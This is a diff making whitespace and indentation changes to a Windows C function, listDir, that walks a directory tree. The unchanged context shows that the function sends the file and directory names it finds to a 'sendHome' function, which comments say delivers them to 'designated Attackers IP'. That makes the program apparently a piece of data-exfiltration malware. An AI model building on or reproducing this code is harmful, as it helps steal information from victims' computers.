@@ -59,7 +59,7 @@ int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursi
 	handle = FindFirstFile(pathArr, &findData);
 
 	//Keep iterating files within the user selected directory.
-	do 
+	do
 	{
 		//Check whether you found a file or a directory.
 		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
@@ -79,7 +79,7 @@ int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursi
 						_tprintf(_T("ERROR: wcstombs_s function call failed."));
 						return 1;
 					}
-					
+
 					//Sends tab data to sendHome function 
 					//to be sent to designated Attackers IP. 
 					if (sendHome(string, 0))
@@ -145,7 +145,7 @@ int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursi
 					return 1;
 				}
 			}
-			
+
 			_stprintf_s(temp, 256, TEXT("%s \n"), findData.cFileName);
 
 			//Convert TCHAR to char buffer.
@@ -163,7 +163,7 @@ int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursi
 				return 1;
 			}
 		}
-	//Keep iterating through files as long as they're available.
+		//Keep iterating through files as long as they're available.
 	} while (FindNextFile(handle, &findData) != 0);
 
 	//Close handle.
